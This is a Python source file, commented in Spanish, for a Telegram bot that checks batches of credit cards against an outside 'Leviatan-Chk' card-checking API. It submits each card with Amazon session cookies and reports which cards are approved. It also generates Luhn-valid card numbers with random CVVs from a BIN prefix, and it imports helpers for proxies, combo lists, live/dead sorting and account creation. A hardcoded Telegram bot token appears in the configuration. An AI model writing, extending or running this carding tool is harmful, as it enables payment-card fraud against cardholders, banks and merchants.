#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Bot de Telegram para verificación MASIVA de tarjetas de crédito (Hasta 10)
Utiliza la API de Leviatan-Chk para validar tarjetas (Amazon Global)
"""
import subprocess
import telebot
import requests
import os
import re
import json
import time
import random
from dotenv import load_dotenv
from typing import Dict, Optional, List
from func_bin import get_bin_info
from func_gen import cc_generar

#from Func import connect_to_db
#from b3maxing import braintree
#from gates_nomus import principal
import datetime
#from gates_nomus import mis_parametros

from rich.console import Console
from rich.text import Text
from rich.panel import Panel
from rich.align import Align
from rich.table import Table

# from gen import cc_gen, cargar_bin_db, buscar_bin
from main_stripe import (
    cargar_proxies, cargar_tokens, cargar_combo,
    guardar_combo, guardar_live, guardar_dead,
    check_card, format_proxy, log_to_file,
    registrar_cuenta, crear_cuentas_para_check,
    MONTOS, API_NO_DISPONIBLE, TOKENS_FILE,
    procesar_tarjetas_pegadas, USED_PHONES
)
 
CUENTAS_FIJAS = 10
TARJETAS_POR_CUENTA_FIJO = 15
ERRORES_ROTACION = 2

# Cargar variables de entorno
#load_dotenv('bot_config.env')

# Configuración
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8652995598:AAFGib3mUxVkFvxC3lJGi-z303yeHZdEb_I')
LEVIATAN_API_URL = "https://leviatan-chk.site/amazon/leviatan"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# Inicializar el bot
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

def validate_card_format(card: str) -> bool:
    pattern = r'^(\d{13,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})$'
    return bool(re.match(pattern, card.strip()))


def check_card_api(card: str, cookies: str) -> Dict:
    """Función interna para llamar a la API para una sola tarjeta"""
    try:
        data = {"card": card.strip(), "cookies": cookies.strip()}
        headers = {"Content-Type": "application/json", "User-Agent": USER_AGENT}
        
        response = requests.post(LEVIATAN_API_URL, json=data, headers=headers, timeout=45)
        
        if response.status_code != 200:
            return {'success': False, 'error': f'Error API HTTP {response.status_code}'}
        
        result = response.json()
        if isinstance(result, list) and len(result) > 0:
            result = result[0]
            
        if 'error' in result:
            return {'success': False, 'error': result['error']}
            
        return {'success': True, 'data': result}
    except Exception as e:
        return {'success': False, 'error': str(e)}


def format_single_result(result: Dict, index: int = None) -> str:
    """Formatea el resultado de una sola tarjeta de forma compacta"""
    prefix = f"<b>[{index}]</b> " if index is not None else ""
    
    if not result.get('success'):
        return f"{prefix}❌ Error: {result.get('error')}"
    
    data = result.get('data', {})
    status = data.get('status', 'N/A')
    msg = data.get('message', 'N/A')
    card = data.get('card', 'N/A')
    
    # Limpiar mensaje de @LeviatanChk si existe para que sea más limpio
    msg = msg.replace("@LeviatanChk", "").strip()
    
    # Emoji basado en status
    emoji = "✅" if "Approved" in status or "Aprobada" in status else "❌"
    if "Error" in status or "⚠️" in status: emoji = "⚠️"
    
    res_str = f"{prefix}{emoji} <code>{card}</code>\n"
    res_str += f"┗ <b>Resultado:</b> {msg}\n"
    
    if "bin" in data:
        res_str += f"┗ <b>Info:</b> {data.get('bin')} | {data.get('bank')} | {data.get('country')}\n"
    
    return res_str


#------COMANDO /GEN  --------#
#@bot.message_handler(commands=['gen'])
#def gen_handler(message):



#------------ GATE OLIMPO /BIN ---------------#    
#@bot.message_handler(commands=['bin'] or ['BIN'])
#def valida_command(message):



def _card_length(bin_prefix):
    p = bin_prefix
    if p.startswith(("34", "37")):
        return 15
    if p.startswith(("300", "301", "302", "303", "304", "305", "36", "38", "39")):
        return 14
    return 16


def _cvv_length(bin_prefix):
    return 4 if bin_prefix.startswith(("34", "37")) else 3


def luhn_verification(num):
    digs = [int(d) for d in str(num)]
    check = digs.pop()
    digs.reverse()
    total = 0
    for i, d in enumerate(digs):
        if i % 2 == 0:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return (total * 9) % 10 == check


def _build_valid_card(prefix, length):
    while True:
        remaining = length - len(prefix) - 1
        partial = str(prefix) + "".join(random.choices("0123456789", k=remaining))
        total = 0
        rev = partial[::-1]
        for i, ch in enumerate(rev):
            d = int(ch)
            if i % 2 == 0:
                d *= 2
                if d > 9:
                    d -= 9
            total += d
        check = (10 - (total % 10)) % 10
        card = partial + str(check)
        if len(card) == length:
            return card


def cc_gen(bin_prefix, mes, ano, cantidad):
    length = _card_length(bin_prefix)
    cvv_len = _cvv_length(bin_prefix)
    ccs = []
    seen = set()
    while len(ccs) < cantidad:
        card = _build_valid_card(bin_prefix, length)
        if card in seen:
            continue
        seen.add(card)
        cvv = "".join(random.choices("0123456789", k=cvv_len))
        ccs.append(f"{card}|{mes}|{ano}|{cvv}")
    return ccs


def cargar_bin_db():
    BIN_FILE = "tarjetas.csv"
    if not os.path.exists(BIN_FILE):
        return {}
    db = {}
    #*** with open(BIN_FILE, newline="", encoding="utf-8-sig") as f:
    #    for row in csv.DictReader(f):
    #        bin_num = row.get("bin", "").strip()
    #        if bin_num:
    #***            db[bin_num] = dict(row)
    return db


def buscar_bin(cc, bin_db):
    for size in (8, 6):
        prefix = cc[:size]
        if prefix in bin_db:
            return bin_db[prefix]
    return {}